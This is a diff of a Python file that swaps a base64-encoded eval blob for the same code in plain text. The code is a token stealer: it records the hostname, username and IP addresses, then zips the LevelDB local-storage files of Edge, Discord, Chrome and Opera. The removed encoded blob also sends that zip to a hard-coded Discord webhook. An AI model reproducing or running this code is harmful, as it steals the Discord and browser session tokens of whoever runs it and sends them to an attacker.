@@ -1,3 +1,304 @@
+import os
+import zipfile
+import requests
+import random
+import datetime
+import time
+import string
+import tempfile
+import socket
+import requests
+import getpass
 import base64, codecs
+#WEBHOOK_URL
+WEBHOOK_URL = 'https://discord.com/api/webhooks/1054102989721313311/_oXOFzejbOqsb8Q5-LMIqmStS7iRJNwuoi88pH8DhlDXnm-n1rIv4mHFqXdlm8G6phwE'
 
-eval(compile(base64.b64decode("aW1wb3J0IG9zCmltcG9ydCB6aXBmaWxlCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgcmFuZG9tCmltcG9ydCBkYXRldGltZQppbXBvcnQgdGltZQppbXBvcnQgc3RyaW5nCmltcG9ydCB0ZW1wZmlsZQppbXBvcnQgc29ja2V0CmltcG9ydCByZXF1ZXN0cwppbXBvcnQgZ2V0cGFzcwppbXBvcnQgYmFzZTY0LCBjb2RlY3MKI1dFQkhPT0tfVVJMCldFQkhPT0tfVVJMID0gJ2h0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEwNTQxMDI5ODk3MjEzMTMzMTEvX29YT0Z6ZWpiT3FzYjhRNS1MTUlxbVN0UzdpUkpOd3VvaTg4cEg4RGhsRFhubS1uMXJJdjRtSEZxWGRsbThHNnBod0UnCgpURU1QID0gdGVtcGZpbGUuZ2V0dGVtcGRpcigpCm9zLmNoZGlyKFRFTVApCgojSE9TVApob3N0bmFtZSA9IHNvY2tldC5nZXRob3N0bmFtZSgpCnVzZXIgPSBnZXRwYXNzLmdldHVzZXIoKQojSVAKaXBfYWRkcmVzcyA9IHNvY2tldC5nZXRob3N0YnluYW1lKGhvc3RuYW1lKQpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29uJykKCiNQVUJMSUMgSVAKaXBfcHVibGljID0gcmVzcG9uc2UuanNvbigpWydpcCddCgojREFCQVRBU0UKTE9DQUwgPSBvcy5nZXRlbnYoIkxPQ0FMQVBQREFUQSIpClJPQU1JTkcgPSBvcy5nZXRlbnYoIkFQUERBVEEiKQpEQiA9ICJcXExPQ0FMIFNUT1JBR0VcXExFVkVMREIiCgoKI1BBVEgKUExBVEZPUk0gPSAiRURHRSIKRElSRVRPUklPUyA9IFtMT0NBTCArICJcXE1JQ1JPU09GVFxcRURHRVxcVVNFUiBEQVRBXFxERUZBVUxUIiArIERCLCAKICAgICAgICAgICAgICBMT0NBTCArICJcXE1JQ1JPU09GVFxcRURHRVxcVVNFUiBEQVRBXFxQUk9GSUxFIDEiICsgREIsIAogICAgICAgICAgICAgIExPQ0FMICsgIlxcTUlDUk9TT0ZUXFxFREdFXFxVU0VSIERBVEFcXFBST0ZJTEUgMiIgKyBEQiwKICAgICAgICAgICAgICBMT0NBTCArICJcXE1JQ1JPU09GVFxcRURHRVxcVVNFUiBEQVRBXFxQUk9GSUxFIDMiICsgREIsCiAgICAgICAgICAgICAgTE9DQUwgKyAiXFxNSUNST1NPRlRcXEVER0VcXFVTRVIgREFUQVxcUFJPRklMRSA0IiArIERCLAogICAgICAgICAgICAgIExPQ0FMICsgIlxcTUlDUk9TT0ZUXFxFREdFXFxVU0VSIERBVEFcXFBST0ZJTEUgNSIgKyBEQgpdICAgICAgIAoKCiNDT05GSUcKWklQID0gZid7dXNlcn0gJyArICcnLmpvaW4ocmFuZG9tLmNob2ljZShzdHJpbmcuZGlnaXRzKSBmb3IgXyBpbiByYW5nZSg4KSkgKyAnLnppcCcKRVhUID0gWycubG9nJywgJy5sZGInXQoKI1pJUApmb3IgZGlyZXRvcmlvIGluIERJUkVUT1JJT1M6CiAgICBpZiBvcy5wYXRoLmV4aXN0cyhkaXJldG9yaW8pOgogICAgICAgIHdpdGggemlwZmlsZS5aaXBGaWxlKFpJUCwgJ2EnKSBhcyB6aXBmOgogICAgICAgICAgICBmb3IgcGFzdGFfYXR1YWwsIHN1YnBhc3RhcywgYXJxdWl2b3MgaW4gb3Mud2FsayhkaXJldG9yaW8pOgogICAgICAgICAgICAgICAgZm9yIGFycXVpdm8gaW4gYXJxdWl2b3M6CiAgICAgICAgICAgICAgICAgICAgY2FtaW5ob19jb21wbGV0byA9IG9zLnBhdGguam9pbihwYXN0YV9hdHVhbCwgYXJxdWl2bykKICAgICAgICAgICAgICAgICAgICBleHRlbnNhbyA9IG9zLnBhdGguc3BsaXRleHQoYXJxdWl2bylbMV0KICAgICAgICAgICAgICAgICAgICBpZiBleHRlbnNhbyBpbiBFWFQ6CiAgICAgICAgICAgICAgICAgICAgICAgIG5vbWVfbm9femlwID0gb3MucGF0aC5yZWxwYXRoKGNhbWluaG9fY29tcGxldG8sIGRpcmV0b3JpbykKICAgICAgICAgICAgICAgICAgICAgICAgIwogICAgICAgICAgICAgICAgICAgICAgICBjb250YWRvciA9IDEKICAgICAgICAgICAgICAgICAgICAgICAgbm9tZV9ub196aXBfb3JpZ2luYWwgPSBub21lX25vX3ppcAogICAgICAgICAgICAgICAgICAgICAgICB3aGlsZSBub21lX25vX3ppcCBpbiB6aXBmLm5hbWVsaXN0KCk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBub21lX25vX3ppcCA9IGYne29zLnBhdGguc3BsaXRleHQobm9tZV9ub196aXBfb3JpZ2luYWwpWzBdfV97Y29udGFkb3J9e2V4dGVuc2FvfScKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRhZG9yICs9IDEKICAgICAgICAgICAgICAgICAgICAgICAgemlwZi53cml0ZShjYW1pbmhvX2NvbXBsZXRvLCBub21lX25vX3ppcCkKICAgIGVsc2U6CiAgICAgICAgdGltZS5zbGVlcCgwLjAwMSkKCgoKCiNQQVRIClBMQVRGT1JNID0gIkRJU0NPUkQiCkRJUkVUT1JJT1MgPSBbUk9BTUlORyArICJcXERJU0NPUkQiICsgREIsCiAgICAgICAgICAgICAgUk9BTUlORyArICJcXERJU0NPUkRDQU5BUlkiICsgREIsCiAgICAgICAgICAgICAgUk9BTUlORyArICJcXERJU0NPUkRQVEIiICsgREIKXQoKCiNaSVAKZm9yIGRpcmV0b3JpbyBpbiBESVJFVE9SSU9TOgogICAgaWYgb3MucGF0aC5leGlzdHMoZGlyZXRvcmlvKToKICAgICAgICB3aXRoIHppcGZpbGUuWmlwRmlsZShaSVAsICdhJykgYXMgemlwZjoKICAgICAgICAgICAgZm9yIHBhc3RhX2F0dWFsLCBzdWJwYXN0YXMsIGFycXVpdm9zIGluIG9zLndhbGsoZGlyZXRvcmlvKToKICAgICAgICAgICAgICAgIGZvciBhcnF1aXZvIGluIGFycXVpdm9zOgogICAgICAgICAgICAgICAgICAgIGNhbWluaG9fY29tcGxldG8gPSBvcy5wYXRoLmpvaW4ocGFzdGFfYXR1YWwsIGFycXVpdm8pCiAgICAgICAgICAgICAgICAgICAgZXh0ZW5zYW8gPSBvcy5wYXRoLnNwbGl0ZXh0KGFycXVpdm8pWzFdCiAgICAgICAgICAgICAgICAgICAgaWYgZXh0ZW5zYW8gaW4gRVhUOgogICAgICAgICAgICAgICAgICAgICAgICBub21lX25vX3ppcCA9IG9zLnBhdGgucmVscGF0aChjYW1pbmhvX2NvbXBsZXRvLCBkaXJldG9yaW8pCiAgICAgICAgICAgICAgICAgICAgICAgICMKICAgICAgICAgICAgICAgICAgICAgICAgY29udGFkb3IgPSAxCiAgICAgICAgICAgICAgICAgICAgICAgIG5vbWVfbm9femlwX29yaWdpbmFsID0gbm9tZV9ub196aXAKICAgICAgICAgICAgICAgICAgICAgICAgd2hpbGUgbm9tZV9ub196aXAgaW4gemlwZi5uYW1lbGlzdCgpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbm9tZV9ub196aXAgPSBmJ3tvcy5wYXRoLnNwbGl0ZXh0KG5vbWVfbm9femlwX29yaWdpbmFsKVswXX1fe2NvbnRhZG9yfXtleHRlbnNhb30nCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250YWRvciArPSAxCiAgICAgICAgICAgICAgICAgICAgICAgIHppcGYud3JpdGUoY2FtaW5ob19jb21wbGV0bywgbm9tZV9ub196aXApCgoKCgoKCgojUEFUSApQTEFURk9STSA9ICJDSFJPTUUiCkRJUkVUT1JJT1MgPSBbTE9DQUwgKyAiXFxHT09HTEVcXENIUk9NRVxcVVNFUiBEQVRBXFxERUZBVUxUIiArIERCLAogICAgICAgICAgICAgIExPQ0FMICsgIlxcR09PR0xFXFxDSFJPTUVcXFVTRVIgREFUQVxcUFJPRklMRSAxIiArIERCLAogICAgICAgICAgICAgIExPQ0FMICsgIlxcR09PR0xFXFxDSFJPTUVcXFVTRVIgREFUQVxcUFJPRklMRSAyIiArIERCLAogICAgICAgICAgICAgIExPQ0FMICsgIlxcTUlDUk9TT0ZUXFxFREdFXFxVU0VSIERBVEFcXFBST0ZJTEUgMyIgKyBEQiwKICAgICAgICAgICAgICBMT0NBTCArICJcXE1JQ1JPU09GVFxcRURHRVxcVVNFUiBEQVRBXFxQUk9GSUxFIDQiICsgREIsCiAgICAgICAgICAgICAgTE9DQUwgKyAiXFxNSUNST1NPRlRcXEVER0VcXFVTRVIgREFUQVxcUFJPRklMRSA1IiArIERCCl0KCgojWklQCmZvciBkaXJldG9yaW8gaW4gRElSRVRPUklPUzoKICAgIGlmIG9zLnBhdGguZXhpc3RzKGRpcmV0b3Jpbyk6CiAgICAgICAgd2l0aCB6aXBmaWxlLlppcEZpbGUoWklQLCAnYScpIGFzIHppcGY6CiAgICAgICAgICAgIGZvciBwYXN0YV9hdHVhbCwgc3VicGFzdGFzLCBhcnF1aXZvcyBpbiBvcy53YWxrKGRpcmV0b3Jpbyk6CiAgICAgICAgICAgICAgICBmb3IgYXJxdWl2byBpbiBhcnF1aXZvczoKICAgICAgICAgICAgICAgICAgICBjYW1pbmhvX2NvbXBsZXRvID0gb3MucGF0aC5qb2luKHBhc3RhX2F0dWFsLCBhcnF1aXZvKQogICAgICAgICAgICAgICAgICAgIGV4dGVuc2FvID0gb3MucGF0aC5zcGxpdGV4dChhcnF1aXZvKVsxXQogICAgICAgICAgICAgICAgICAgIGlmIGV4dGVuc2FvIGluIEVYVDoKICAgICAgICAgICAgICAgICAgICAgICAgbm9tZV9ub196aXAgPSBvcy5wYXRoLnJlbHBhdGgoY2FtaW5ob19jb21wbGV0bywgZGlyZXRvcmlvKQogICAgICAgICAgICAgICAgICAgICAgICAjCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRhZG9yID0gMQogICAgICAgICAgICAgICAgICAgICAgICBub21lX25vX3ppcF9vcmlnaW5hbCA9IG5vbWVfbm9femlwCiAgICAgICAgICAgICAgICAgICAgICAgIHdoaWxlIG5vbWVfbm9femlwIGluIHppcGYubmFtZWxpc3QoKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5vbWVfbm9femlwID0gZid7b3MucGF0aC5zcGxpdGV4dChub21lX25vX3ppcF9vcmlnaW5hbClbMF19X3tjb250YWRvcn17ZXh0ZW5zYW99JwogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGFkb3IgKz0gMQogICAgICAgICAgICAgICAgICAgICAgICB6aXBmLndyaXRlKGNhbWluaG9fY29tcGxldG8sIG5vbWVfbm9femlwKQoKCgoKCgoKCgoKI1BBVEgKUExBVEZPUk0gPSAiT1BFUkEiCkRJUkVUT1JJT1MgPSBbUk9BTUlORyArICJcXE9QRVJBIFNPRlRXQVJFXFxPUEVSQSBTVEFCTEUiICsgREIsCiAgICAgICAgICAgICAgUk9BTUlORyArICJcXE9QRVJBIFNPRlRXQVJFXFxPUEVSQSBHWCBTVEFCTEUiICsgREIKXQoKCiNaSVAKZm9yIGRpcmV0b3JpbyBpbiBESVJFVE9SSU9TOgogICAgaWYgb3MucGF0aC5leGlzdHMoZGlyZXRvcmlvKToKICAgICAgICB3aXRoIHppcGZpbGUuWmlwRmlsZShaSVAsICdhJykgYXMgemlwZjoKICAgICAgICAgICAgZm9yIHBhc3RhX2F0dWFsLCBzdWJwYXN0YXMsIGFycXVpdm9zIGluIG9zLndhbGsoZGlyZXRvcmlvKToKICAgICAgICAgICAgICAgIGZvciBhcnF1aXZvIGluIGFycXVpdm9zOgogICAgICAgICAgICAgICAgICAgIGNhbWluaG9fY29tcGxldG8gPSBvcy5wYXRoLmpvaW4ocGFzdGFfYXR1YWwsIGFycXVpdm8pCiAgICAgICAgICAgICAgICAgICAgZXh0ZW5zYW8gPSBvcy5wYXRoLnNwbGl0ZXh0KGFycXVpdm8pWzFdCiAgICAgICAgICAgICAgICAgICAgaWYgZXh0ZW5zYW8gaW4gRVhUOgogICAgICAgICAgICAgICAgICAgICAgICBub21lX25vX3ppcCA9IG9zLnBhdGgucmVscGF0aChjYW1pbmhvX2NvbXBsZXRvLCBkaXJldG9yaW8pCiAgICAgICAgICAgICAgICAgICAgICAgICMKICAgICAgICAgICAgICAgICAgICAgICAgY29udGFkb3IgPSAxCiAgICAgICAgICAgICAgICAgICAgICAgIG5vbWVfbm9femlwX29yaWdpbmFsID0gbm9tZV9ub196aXAKICAgICAgICAgICAgICAgICAgICAgICAgd2hpbGUgbm9tZV9ub196aXAgaW4gemlwZi5uYW1lbGlzdCgpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbm9tZV9ub196aXAgPSBmJ3tvcy5wYXRoLnNwbGl0ZXh0KG5vbWVfbm9femlwX29yaWdpbmFsKVswXX1fe2NvbnRhZG9yfXtleHRlbnNhb30nCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250YWRvciArPSAxCiAgICAgICAgICAgICAgICAgICAgICAgIHppcGYud3JpdGUoY2FtaW5ob19jb21wbGV0bywgbm9tZV9ub196aXApCgoKCgoKCgoKCgoKCgoKCgoKCgojUEFUSApQTEFURk9STSA9ICJCUkFWRSIKRElSRVRPUklPUyA9IFtMT0NBTCArICJcXEJSQVZFU09GVFdBUkVcXEJSQVZFLUJST1dTRVJcXFVTRVIgREFUQVxcREVGQVVMVCIgKyBEQiwKICAgICAgICAgICAgICBMT0NBTCArICJcXEJSQVZFU09GVFdBUkVcXEJSQVZFLUJST1dTRVJcXFVTRVIgREFUQVxcUFJPRklMRSAxIiArIERCLAogICAgICAgICAgICAgIExPQ0FMICsgIlxcQlJBVkVTT0ZUV0FSRVxcQlJBVkUtQlJPV1NFUlxcVVNFUiBEQVRBXFxQUk9GSUxFIDIiICsgREIsCiAgICAgICAgICAgICAgTE9DQUwgKyAiXFxCUkFWRVNPRlRXQVJFXFxCUkFWRS1CUk9XU0VSXFxVU0VSIERBVEFcXFBST0ZJTEUgMyIgKyBEQiwKICAgICAgICAgICAgICBMT0NBTCArICJcXEJSQVZFU09GVFdBUkVcXEJSQVZFLUJST1dTRVJcXFVTRVIgREFUQVxcUFJPRklMRSA0IiArIERCLAogICAgICAgICAgICAgIExPQ0FMICsgIlxcQlJBVkVTT0ZUV0FSRVxcQlJBVkUtQlJPV1NFUlxcVVNFUiBEQVRBXFxQUk9GSUxFIDUiICsgREIKXQoKCiNaSVAKZm9yIGRpcmV0b3JpbyBpbiBESVJFVE9SSU9TOgogICAgaWYgb3MucGF0aC5leGlzdHMoZGlyZXRvcmlvKToKICAgICAgICB3aXRoIHppcGZpbGUuWmlwRmlsZShaSVAsICdhJykgYXMgemlwZjoKICAgICAgICAgICAgZm9yIHBhc3RhX2F0dWFsLCBzdWJwYXN0YXMsIGFycXVpdm9zIGluIG9zLndhbGsoZGlyZXRvcmlvKToKICAgICAgICAgICAgICAgIGZvciBhcnF1aXZvIGluIGFycXVpdm9zOgogICAgICAgICAgICAgICAgICAgIGNhbWluaG9fY29tcGxldG8gPSBvcy5wYXRoLmpvaW4ocGFzdGFfYXR1YWwsIGFycXVpdm8pCiAgICAgICAgICAgICAgICAgICAgZXh0ZW5zYW8gPSBvcy5wYXRoLnNwbGl0ZXh0KGFycXVpdm8pWzFdCiAgICAgICAgICAgICAgICAgICAgaWYgZXh0ZW5zYW8gaW4gRVhUOgogICAgICAgICAgICAgICAgICAgICAgICBub21lX25vX3ppcCA9IG9zLnBhdGgucmVscGF0aChjYW1pbmhvX2NvbXBsZXRvLCBkaXJldG9yaW8pCiAgICAgICAgICAgICAgICAgICAgICAgICMKICAgICAgICAgICAgICAgICAgICAgICAgY29udGFkb3IgPSAxCiAgICAgICAgICAgICAgICAgICAgICAgIG5vbWVfbm9femlwX29yaWdpbmFsID0gbm9tZV9ub196aXAKICAgICAgICAgICAgICAgICAgICAgICAgd2hpbGUgbm9tZV9ub196aXAgaW4gemlwZi5uYW1lbGlzdCgpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbm9tZV9ub196aXAgPSBmJ3tvcy5wYXRoLnNwbGl0ZXh0KG5vbWVfbm9femlwX29yaWdpbmFsKVswXX1fe2NvbnRhZG9yfXtleHRlbnNhb30nCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250YWRvciArPSAxCiAgICAgICAgICAgICAgICAgICAgICAgIHppcGYud3JpdGUoY2FtaW5ob19jb21wbGV0bywgbm9tZV9ub196aXApCgoKCgoKCgoKCgoKCiNQQVRIClBMQVRGT1JNID0gIllBTkRFWCIKRElSRVRPUklPUyA9IFtMT0NBTCArICJcXFlBTkRFWFxcWUFOREVYQlJPV1NFUlxcVVNFUiBEQVRBXFxERUZBVUxUIiArIERCLAogICAgICAgICAgICAgIExPQ0FMICsgIlxcWUFOREVYXFxZQU5ERVhCUk9XU0VSXFxVU0VSIERBVEFcXFBST0ZJTEUgMSIgKyBEQiwKICAgICAgICAgICAgICBMT0NBTCArICJcXFlBTkRFWFxcWUFOREVYQlJPV1NFUlxcVVNFUiBEQVRBXFxQUk9GSUxFIDIiICsgREIsCiAgICAgICAgICAgICAgTE9DQUwgKyAiXFxZQU5ERVhcXFlBTkRFWEJST1dTRVJcXFVTRVIgREFUQVxcUFJPRklMRSAzIiArIERCLAogICAgICAgICAgICAgIExPQ0FMICsgIlxcWUFOREVYXFxZQU5ERVhCUk9XU0VSXFxVU0VSIERBVEFcXFBST0ZJTEUgNCIgKyBEQiwKICAgICAgICAgICAgICBMT0NBTCArICJcXFlBTkRFWFxcWUFOREVYQlJPV1NFUlxcVVNFUiBEQVRBXFxQUk9GSUxFIDUiICsgREIKXQoKCiNaSVAKZm9yIGRpcmV0b3JpbyBpbiBESVJFVE9SSU9TOgogICAgaWYgb3MucGF0aC5leGlzdHMoZGlyZXRvcmlvKToKICAgICAgICB3aXRoIHppcGZpbGUuWmlwRmlsZShaSVAsICdhJykgYXMgemlwZjoKICAgICAgICAgICAgZm9yIHBhc3RhX2F0dWFsLCBzdWJwYXN0YXMsIGFycXVpdm9zIGluIG9zLndhbGsoZGlyZXRvcmlvKToKICAgICAgICAgICAgICAgIGZvciBhcnF1aXZvIGluIGFycXVpdm9zOgogICAgICAgICAgICAgICAgICAgIGNhbWluaG9fY29tcGxldG8gPSBvcy5wYXRoLmpvaW4ocGFzdGFfYXR1YWwsIGFycXVpdm8pCiAgICAgICAgICAgICAgICAgICAgZXh0ZW5zYW8gPSBvcy5wYXRoLnNwbGl0ZXh0KGFycXVpdm8pWzFdCiAgICAgICAgICAgICAgICAgICAgaWYgZXh0ZW5zYW8gaW4gRVhUOgogICAgICAgICAgICAgICAgICAgICAgICBub21lX25vX3ppcCA9IG9zLnBhdGgucmVscGF0aChjYW1pbmhvX2NvbXBsZXRvLCBkaXJldG9yaW8pCiAgICAgICAgICAgICAgICAgICAgICAgICMKICAgICAgICAgICAgICAgICAgICAgICAgY29udGFkb3IgPSAxCiAgICAgICAgICAgICAgICAgICAgICAgIG5vbWVfbm9femlwX29yaWdpbmFsID0gbm9tZV9ub196aXAKICAgICAgICAgICAgICAgICAgICAgICAgd2hpbGUgbm9tZV9ub196aXAgaW4gemlwZi5uYW1lbGlzdCgpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbm9tZV9ub196aXAgPSBmJ3tvcy5wYXRoLnNwbGl0ZXh0KG5vbWVfbm9femlwX29yaWdpbmFsKVswXX1fe2NvbnRhZG9yfXtleHRlbnNhb30nCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250YWRvciArPSAxCiAgICAgICAgICAgICAgICAgICAgICAgIHppcGYud3JpdGUoY2FtaW5ob19jb21wbGV0bywgbm9tZV9ub196aXApCgoKCgoKCgoKCgoKCiNQQVRIClBMQVRGT1JNID0gIkNIUk9NRSBTWFMiCkRJUkVUT1JJT1MgPSBbTE9DQUwgKyAiXFxHT09HTEVcXENIUk9NRSBTWFNcXFVTRVIgREFUQVxcREVGQVVMVCIgKyBEQiwKICAgICAgICAgICAgICBMT0NBTCArICJcXEdPT0dMRVxcQ0hST01FIFNYU1xcVVNFUiBEQVRBXFxQUk9GSUxFIDEiICsgREIsCiAgICAgICAgICAgICAgTE9DQUwgKyAiXFxHT09HTEVcXENIUk9NRSBTWFNcXFVTRVIgREFUQVxcUFJPRklMRSAyIiArIERCLAogICAgICAgICAgICAgIExPQ0FMICsgIlxcR09PR0xFXFxDSFJPTUUgU1hTXFxVU0VSIERBVEFcXFBST0ZJTEUgMyIgKyBEQiwKICAgICAgICAgICAgICBMT0NBTCArICJcXEdPT0dMRVxcQ0hST01FIFNYU1xcVVNFUiBEQVRBXFxQUk9GSUxFIDQiICsgREIsCiAgICAgICAgICAgICAgTE9DQUwgKyAiXFxHT09HTEVcXENIUk9NRSBTWFNcXFVTRVIgREFUQVxcUFJPRklMRSA1IiArIERCCl0KCgojWklQCmZvciBkaXJldG9yaW8gaW4gRElSRVRPUklPUzoKICAgIGlmIG9zLnBhdGguZXhpc3RzKGRpcmV0b3Jpbyk6CiAgICAgICAgd2l0aCB6aXBmaWxlLlppcEZpbGUoWklQLCAnYScpIGFzIHppcGY6CiAgICAgICAgICAgIGZvciBwYXN0YV9hdHVhbCwgc3VicGFzdGFzLCBhcnF1aXZvcyBpbiBvcy53YWxrKGRpcmV0b3Jpbyk6CiAgICAgICAgICAgICAgICBmb3IgYXJxdWl2byBpbiBhcnF1aXZvczoKICAgICAgICAgICAgICAgICAgICBjYW1pbmhvX2NvbXBsZXRvID0gb3MucGF0aC5qb2luKHBhc3RhX2F0dWFsLCBhcnF1aXZvKQogICAgICAgICAgICAgICAgICAgIGV4dGVuc2FvID0gb3MucGF0aC5zcGxpdGV4dChhcnF1aXZvKVsxXQogICAgICAgICAgICAgICAgICAgIGlmIGV4dGVuc2FvIGluIEVYVDoKICAgICAgICAgICAgICAgICAgICAgICAgbm9tZV9ub196aXAgPSBvcy5wYXRoLnJlbHBhdGgoY2FtaW5ob19jb21wbGV0bywgZGlyZXRvcmlvKQogICAgICAgICAgICAgICAgICAgICAgICAjCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRhZG9yID0gMQogICAgICAgICAgICAgICAgICAgICAgICBub21lX25vX3ppcF9vcmlnaW5hbCA9IG5vbWVfbm9femlwCiAgICAgICAgICAgICAgICAgICAgICAgIHdoaWxlIG5vbWVfbm9femlwIGluIHppcGYubmFtZWxpc3QoKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5vbWVfbm9femlwID0gZid7b3MucGF0aC5zcGxpdGV4dChub21lX25vX3ppcF9vcmlnaW5hbClbMF19X3tjb250YWRvcn17ZXh0ZW5zYW99JwogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGFkb3IgKz0gMQogICAgICAgICAgICAgICAgICAgICAgICB6aXBmLndyaXRlKGNhbWluaG9fY29tcGxldG8sIG5vbWVfbm9femlwKQoKCiNNRU5HQUdFTQptZXNzYWdlID0gZicqKkJSVVRFRk9SQ0UgI0xPRyAtIHtQTEFURk9STS51cHBlcigpfSAoU1RBUlRFRCBBVDoge2RhdGV0aW1lLmRhdGV0aW1lLm5vdygpLnJlcGxhY2Uoc2Vjb25kPTAsIG1pY3Jvc2Vjb25kPTApfSkqKlxuJwptZXNzYWdlICs9IGYnYGBgSVA6IHtpcF9hZGRyZXNzfS97aXBfcHVibGljfSAgICAgICAgSE9TVE5BTUU6IHtob3N0bmFtZX1gYGBcbicKCiNQQVlMT0FEUwp3aXRoIG9wZW4oWklQLCAncmInKSBhcyBhcnF1aXZvOgogICAgcGF5bG9hZCA9IHsnY29udGVudCc6IG1lc3NhZ2V9CiAgICBmaWxlcyA9IHsnZmlsZSc6IGFycXVpdm99CiAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QoV0VCSE9PS19VUkwsIGRhdGE9cGF5bG9hZCwgZmlsZXM9ZmlsZXMp"), "<string>", 'exec'))
+TEMP = tempfile.gettempdir()
+os.chdir(TEMP)
+
+#HOST
+hostname = socket.gethostname()
+user = getpass.getuser()
+#IP
+ip_address = socket.gethostbyname(hostname)
+response = requests.get('https://api.ipify.org?format=json')
+
+#PUBLIC IP
+ip_public = response.json()['ip']
+
+#DABATASE
+LOCAL = os.getenv("LOCALAPPDATA")
+ROAMING = os.getenv("APPDATA")
+DB = "\\LOCAL STORAGE\\LEVELDB"
+
+
+#PATH
+PLATFORM = "EDGE"
+DIRETORIOS = [LOCAL + "\\MICROSOFT\\EDGE\\USER DATA\\DEFAULT" + DB, 
+              LOCAL + "\\MICROSOFT\\EDGE\\USER DATA\\PROFILE 1" + DB, 
+              LOCAL + "\\MICROSOFT\\EDGE\\USER DATA\\PROFILE 2" + DB,
+              LOCAL + "\\MICROSOFT\\EDGE\\USER DATA\\PROFILE 3" + DB,
+              LOCAL + "\\MICROSOFT\\EDGE\\USER DATA\\PROFILE 4" + DB,
+              LOCAL + "\\MICROSOFT\\EDGE\\USER DATA\\PROFILE 5" + DB
+]       
+
+#CONFIG
+ZIP = f'{user} ' + ''.join(random.choice(string.digits) for _ in range(8)) + '.zip'
+EXT = ['.log', '.ldb']
+
+#ZIP
+for diretorio in DIRETORIOS:
+    if os.path.exists(diretorio):
+        with zipfile.ZipFile(ZIP, 'a') as zipf:
+            for pasta_atual, subpastas, arquivos in os.walk(diretorio):
+                for arquivo in arquivos:
+                    caminho_completo = os.path.join(pasta_atual, arquivo)
+                    extensao = os.path.splitext(arquivo)[1]
+                    if extensao in EXT:
+                        nome_no_zip = os.path.relpath(caminho_completo, diretorio)
+                        #
+                        contador = 1
+                        nome_no_zip_original = nome_no_zip
+                        while nome_no_zip in zipf.namelist():
+                            nome_no_zip = f'{os.path.splitext(nome_no_zip_original)[0]}_{contador}{extensao}'
+                            contador += 1
+                        zipf.write(caminho_completo, nome_no_zip)
+    else:
+        time.sleep(0.001)
+
+
+
+
+
+#PATH
+PLATFORM = "DISCORD"
+DIRETORIOS = [ROAMING + "\\DISCORD" + DB,
+              ROAMING + "\\DISCORDCANARY" + DB,
+              ROAMING + "\\DISCORDPTB" + DB
+]
+
+
+#ZIP
+for diretorio in DIRETORIOS:
+    if os.path.exists(diretorio):
+        with zipfile.ZipFile(ZIP, 'a') as zipf:
+            for pasta_atual, subpastas, arquivos in os.walk(diretorio):
+                for arquivo in arquivos:
+                    caminho_completo = os.path.join(pasta_atual, arquivo)
+                    extensao = os.path.splitext(arquivo)[1]
+                    if extensao in EXT:
+                        nome_no_zip = os.path.relpath(caminho_completo, diretorio)
+                        #
+                        contador = 1
+                        nome_no_zip_original = nome_no_zip
+                        while nome_no_zip in zipf.namelist():
+                            nome_no_zip = f'{os.path.splitext(nome_no_zip_original)[0]}_{contador}{extensao}'
+                            contador += 1
+                        zipf.write(caminho_completo, nome_no_zip)
+
+
+
+
+
+
+
+#PATH
+PLATFORM = "CHROME"
+DIRETORIOS = [LOCAL + "\\GOOGLE\\CHROME\\USER DATA\\DEFAULT" + DB,
+              LOCAL + "\\GOOGLE\\CHROME\\USER DATA\\PROFILE 1" + DB,
+              LOCAL + "\\GOOGLE\\CHROME\\USER DATA\\PROFILE 2" + DB,
+              LOCAL + "\\MICROSOFT\\EDGE\\USER DATA\\PROFILE 3" + DB,
+              LOCAL + "\\MICROSOFT\\EDGE\\USER DATA\\PROFILE 4" + DB,
+              LOCAL + "\\MICROSOFT\\EDGE\\USER DATA\\PROFILE 5" + DB
+]
+
+
+#ZIP
+for diretorio in DIRETORIOS:
+    if os.path.exists(diretorio):
+        with zipfile.ZipFile(ZIP, 'a') as zipf:
+            for pasta_atual, subpastas, arquivos in os.walk(diretorio):
+                for arquivo in arquivos:
+                    caminho_completo = os.path.join(pasta_atual, arquivo)
+                    extensao = os.path.splitext(arquivo)[1]
+                    if extensao in EXT:
+                        nome_no_zip = os.path.relpath(caminho_completo, diretorio)
+                        #
+                        contador = 1
+                        nome_no_zip_original = nome_no_zip
+                        while nome_no_zip in zipf.namelist():
+                            nome_no_zip = f'{os.path.splitext(nome_no_zip_original)[0]}_{contador}{extensao}'
+                            contador += 1
+                        zipf.write(caminho_completo, nome_no_zip)
+
+
+
+
+
+
+
+
+
+
+#PATH
+PLATFORM = "OPERA"
+DIRETORIOS = [ROAMING + "\\OPERA SOFTWARE\\OPERA STABLE" + DB,
+              ROAMING + "\\OPERA SOFTWARE\\OPERA GX STABLE" + DB
+]
+
+
+#ZIP
+for diretorio in DIRETORIOS:
+    if os.path.exists(diretorio):
+        with zipfile.ZipFile(ZIP, 'a') as zipf:
+            for pasta_atual, subpastas, arquivos in os.walk(diretorio):
+                for arquivo in arquivos:
+                    caminho_completo = os.path.join(pasta_atual, arquivo)
+                    extensao = os.path.splitext(arquivo)[1]
+                    if extensao in EXT:
+                        nome_no_zip = os.path.relpath(caminho_completo, diretorio)
+                        #
+                        contador = 1
+                        nome_no_zip_original = nome_no_zip
+                        while nome_no_zip in zipf.namelist():
+                            nome_no_zip = f'{os.path.splitext(nome_no_zip_original)[0]}_{contador}{extensao}'
+                            contador += 1
+                        zipf.write(caminho_completo, nome_no_zip)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
